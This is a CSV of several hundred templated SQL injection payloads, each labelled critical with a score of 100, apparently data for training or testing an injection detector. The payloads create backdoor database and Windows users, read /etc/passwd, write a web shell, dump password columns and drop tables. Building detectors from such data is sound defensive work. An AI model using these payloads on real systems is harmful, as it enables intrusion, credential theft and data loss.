query,risk,score
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ll,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 5h,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- a,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # qa,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 1y",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- o,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # s8,critical,100
'; DROP TABLE users; -- /* test */ # f8,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- y,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # cg,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # v4,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- l",critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- o",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 58,critical,100
'; DROP TABLE users; -- /* test */ # 8s,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # eu,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # -- f,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- m,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # uc,critical,100
'; DROP TABLE users; -- /* test */ -- y,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # wm",critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- h,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # kv,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- y",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # rq,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # fl,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; SELECT * FROM mysql.user; -- # gz,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # jq,critical,100
'; SELECT * FROM mysql.user; -- -- 0,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 6l",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # ow,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # xy,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 5m,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # ft,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 69",critical,100
'; DROP TABLE users; -- /* test */ # wx,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # v1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- h,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 50",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # gr,critical,100
"' UNION SELECT username, password FROM users /**/ /* # c2",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- d,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- p,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 0,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # q6,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # wc,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 3,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 0m,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- a,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # if",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- e",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 6x,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # vn",critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 47",critical,100
'; SELECT * FROM mysql.user; -- # b6,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; SELECT * FROM mysql.user; -- # 2w,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- w,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- z,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- s",critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 6,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- e,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- g,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- y,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 0,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # gz,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- g",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; SELECT * FROM mysql.user; -- # 7i,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; DROP TABLE users; -- /* test */ -- o,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # h6,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # tl,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # dc,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 61,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # ln,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- g,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- 2,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- a,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- r,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- r,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- p,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 9r,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- r,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 8s,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; SELECT * FROM mysql.user; -- # 34,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 0d",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 4i,critical,100
'; SELECT * FROM mysql.user; -- # go,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 0,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # jm,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- y,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # by,critical,100
'; SELECT load_file('/etc/passwd'); # -- q,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- a",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- d,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # go,critical,100
'; DROP TABLE users; -- /* test */ -- 7,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 1,critical,100
'; SELECT load_file('/etc/passwd'); # # 4l,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 6c,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 01,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 7,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # n0,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- e,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 8,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # dm,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # br,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- k,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- o,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # ta,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- b",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # or",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 8n,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 3o,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 5,critical,100
"' UNION SELECT username, password FROM users /**/ /* # cg",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # eh",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # bu,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 7,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- k",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # pj,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- q,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ol",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- 6,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 6,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # nw,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- 4,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- t",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 0b",critical,100
'; SELECT * FROM mysql.user; -- # 75,critical,100
'; DROP TABLE users; -- /* test */ -- 6,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 9,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # kr,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ne",critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # dw,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- f",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # wp",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 3,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # my,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- k,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 5,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 2,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # k8,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # ow,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- i,critical,100
'; DROP TABLE users; -- /* test */ -- r,critical,100
'; SELECT load_file('/etc/passwd'); # /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- 4",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- d,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # jx,critical,100
'; DROP TABLE users; -- /* test */ -- 9,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # u4",critical,100
"' UNION SELECT username, password FROM users /**/ /* # vr",critical,100
'; DROP TABLE users; -- /* test */ -- w,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # ej,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # -- o,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # z8,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- n,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 96,critical,100
'; SELECT * FROM mysql.user; -- # x8,critical,100
'; DROP TABLE users; -- /* test */ -- d,critical,100
'; SELECT load_file('/etc/passwd'); # # bp,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # oh,critical,100
'; SELECT * FROM mysql.user; -- # 9e,critical,100
'; SELECT * FROM mysql.user; -- # bg,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # ze,critical,100
'; SELECT * FROM mysql.user; -- # hb,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- w,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # pl,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 2,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # bx,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # nh,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- v,critical,100
'; SELECT * FROM mysql.user; -- -- 7,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- j,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # -- l,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 1v",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 07,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 77,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- 0",critical,100
'; DROP TABLE users; -- /* test */ # 2m,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- m",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- w,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # vc,critical,100
'; DROP TABLE users; -- /* test */ /**/,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/",critical,100
'; DROP TABLE users; -- /* test */ -- 6,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- 1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 1x,critical,100
'; SELECT * FROM mysql.user; -- /**/,critical,100
'; SELECT load_file('/etc/passwd'); # # x2,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # bx",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- 8,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # hk,critical,100
'; DROP TABLE users; -- /* test */ -- 5,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # pl",critical,100
'; SELECT load_file('/etc/passwd'); # # 8y,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 63,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- b,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- w,critical,100
'; SELECT * FROM mysql.user; -- -- o,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- 9,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # n7,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # h5,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 5,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # t4,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 4x",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # wa,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- j,critical,100
'; SELECT load_file('/etc/passwd'); # -- k,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # pz,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # in,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 3s",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- v",critical,100
